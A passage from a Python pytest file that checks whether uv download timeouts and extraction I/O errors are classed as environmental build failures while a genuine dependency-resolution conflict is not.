    assert result is False


@pytest.mark.parametrize(
    "log",
    [
        # Caught live during verification: a real build died here and the
        # contributor's flag was retracted for a network problem.
        "Failed to download distribution due to network timeout. Try "
        "increasing UV_HTTP_TIMEOUT (current value: 30s).",
        "I/O operation failed during extraction",
        "error: Failed to download `protobuf==6.33.6` due to network timeout",
    ],
)
def test_uv_download_timeout_is_environmental(log):
    """uv's own download-failure wording matched none of the docker-centric
    patterns, so a registry timeout read as a broken recipe."""
    proc = subprocess.CompletedProcess(
        args=[], returncode=1, stdout="", stderr=log
    )
    assert md.failure_is_environmental(proc) is True


def test_a_real_dependency_conflict_is_still_a_verdict():
    """The widening must not excuse a genuine resolution failure."""
    proc = subprocess.CompletedProcess(
        args=[],
        returncode=1,
        stdout="",
        stderr=(
            "error: No solution found when resolving dependencies:\n"
            "  Because foo==1.0 depends on bar>=2 and bar<2, we can conclude"
        ),
    )
    assert md.failure_is_environmental(proc) is False
